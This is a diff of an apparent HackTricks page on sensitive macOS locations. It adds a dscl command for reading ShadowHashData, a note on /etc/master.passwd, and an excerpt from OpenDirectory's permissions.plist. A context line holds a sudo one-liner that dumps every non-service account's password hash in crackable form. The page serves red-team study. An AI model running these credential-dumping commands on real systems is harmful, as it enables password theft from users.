@@ -1,8 +1,8 @@
 # macOS Sensitive Locations & Interesting Daemons
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
@@ -37,6 +37,12 @@ An alternative one-liner which will dump creds of all non-service accounts in ha
 sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
 ```
 {% endcode %}
+
+Another way to obtain the `ShadowHashData` of a user is by using `dscl`: ``sudo dscl . -read /Users/`whoami` ShadowHashData``
+
+### /etc/master.passwd
+
+This file is **only used** when the system id running in **single-user mode** (so not very frequently).
 
 ### Keychain Dump
 
@@ -187,11 +193,49 @@ for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.s
 
 ## Preferences
 
-In macOS apps preferences are located in **`$HOME/Library/Preferences`** and in iOS they are in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.&#x20;
+In macOS apps preferences are located in **`$HOME/Library/Preferences`** and in iOS they are in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.
 
 In macOS the cli tool **`defaults`** can be used to **modify the Preferences file**.
 
 **`/usr/sbin/cfprefsd`** claims the XPC services `com.apple.cfprefsd.daemon` and `com.apple.cfprefsd.agent` and can be called to perform actions such as modify preferences.
+
+## OpenDirectory permissions.plist
+
+The file `/System/Library/OpenDirectory/permissions.plist` contains permissions applied on node attributes and is protected by SIP.\
+This file grants permissions to specific users by UUID (and not uid) so they are able to access specific sensitive information like `ShadowHashData`, `HeimdalSRPKey` and `KerberosKeys` among others:
+
+```xml
+[...]
+<key>dsRecTypeStandard:Computers</key>
+<dict>
+	<key>dsAttrTypeNative:ShadowHashData</key>
+	<array>
+		<dict>
+			<!-- allow wheel even though it's implicit -->
+			<key>uuid</key>
+			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
+			<key>permissions</key>
+			<array>
+				<string>readattr</string>
+				<string>writeattr</string>
+			</array>
+		</dict>
+	</array>
+	<key>dsAttrTypeNative:KerberosKeys</key>
+	<array>
+		<dict>
+			<!-- allow wheel even though it's implicit -->
+			<key>uuid</key>
+			<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
+			<key>permissions</key>
+			<array>
+				<string>readattr</string>
+				<string>writeattr</string>
+			</array>
+		</dict>
+	</array>
+[...]
+```
 
 ## System Notifications
 
@@ -251,8 +295,8 @@ These are notifications that the user should see in the screen:
 * **`NSUserNotificationCenter`**: This is the iOS bulletin board in MacOS. The database with the notifications in located in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
